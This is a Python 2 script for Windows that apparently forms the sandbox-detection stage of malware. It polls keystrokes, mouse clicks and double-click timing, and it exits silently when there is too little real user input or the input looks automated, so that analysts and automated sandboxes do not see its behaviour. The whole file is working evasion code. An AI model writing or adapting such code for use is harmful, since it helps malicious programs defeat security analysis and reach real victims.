import ctypes
import random
import time
import sys

user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

# Main variables with which we will track the total number of mouse-clicks,
# double-clicks and keystrokes.
keystrokes = 0
mouse_clicks = 0
double_clicks = 0

# LASTINPUTINFO structure that will hold the timestamp of when the last
# input event was detected on the system
class LASTINPUTINFO(ctypes.Structure):
    _fields_ = [
                    ("cbSize", ctypes.c_uint),
                    ("dwTime", ctypes.c_ulong)                            
                ]

def get_last_input():
    
    struct_lastinputinfo = LASTINPUTINFO()
    # We need to initialize first the cbSize variable to the size of the
    # structure before making the call
    struct_lastinputinfo.cbSize = ctypes.sizeof(LASTINPUTINFO)
    
    # Get the last input registered
    user32.GetLastInputInfo(ctypes.byref(struct_lastinputinfo))
    
    # Determine how long the machine has been running
    run_time = kernel32.GetTickCount()

    elapsed = run_time - struct_lastinputinfo.dwTime

    print "[*] It's beend %d milliseconds since the last input event." % elapsed

    return elapsed

# Test Code:
#while True:
#    get_last_input()
#    time.sleep(1)

# Alternative to pyHook method to look at keystrokes
# This simple function detects the time and the number of the mouse clicks,
# as well as how many keystrokes the target has issued
def get_key_press():
    global mouse_clicks
    global keystrokes

    # We iterate over the range of valid input keys checking for each key 
    # whether the key has been pressed using GetAsyncKeyState
    for i in range (0, 0xff):
        if user32.GetAsyncKeyState(i) == -32767:
            
            # 0x1 is the virtual key code for a left mouse-click
            if i == 0x1: 
                mouse_clicks +=1
                return time.time()
            elif i > 32 and i < 127:
                keystrokes += 1
    return None

# Sandbox detection loop
def detect_sandbox():
    
    global mouse_clicks
    global keystrokes

    max_keystrokes = random.randint(10,25)
    max_mouse_clicks = random.randint(5,25)

    double_clicks = 0
    max_double_clicks = 10
    double_click_threshold = 0.350 # in seconds
    first_double_click = None

    average_mousetime = 0
    max_input_threshold = 30000 # in milliseconds

    previous_timestamp = None
    detection_complete = False

    # Get the last input registered from the system
    last_input = get_last_input()

    # If we hit our threshold let's bail out
    if last_input >= max_input_threshold:
        sys.exit(0)

    while not detection_complete:
        # Check for key pressed or mouse clicks and 
        # get the timestamp of the event
        keypress_time = get_key_press()
        
        if keypress_time is not None and previous_timestamp is not None:
            # Calculate the time between mouse clicks
            elapsed = keypress_time - previous_timestamp
            print "Elapsed time %s" % elapsed
            
            # We compare it to our threshold to see if it was a double click
            if elapsed <= double_click_threshold:
                double_clicks += 1

                if first_double_click is None:
                    # Grab the timestamp of the first double click
                    first_double_click = time.time()
                else:
                    # We want to see if the sandbox operator has been streaming click events into
                    # the sandbox to try to fake out sandbox detection techniques.
                    # It is quite uncommon to see 100 double clicks in a row in a normal use.
                    if double_clicks == max_double_clicks:
                        # Too many double clicks in too little time: bail out
                        time_slot = keypress_time - first_double_click
                        minimum_total_threshold = max_double_clicks * double_click_threshold
                        if time_slot < minimum_total_threshold:
                            sys.exit(0)
            # We are happy! There's enough user input we can succesfully return
            if keystrokes >= max_keystrokes and double_clicks >= max_double_clicks and mouse_clicks >= max_mouse_clicks:                
                return
            previous_timestamp =  keypress_time

        elif keypress_time is not None:
            previous_timestamp = keypress_time

detect_sandbox()
print "We are ok!"


                    
        

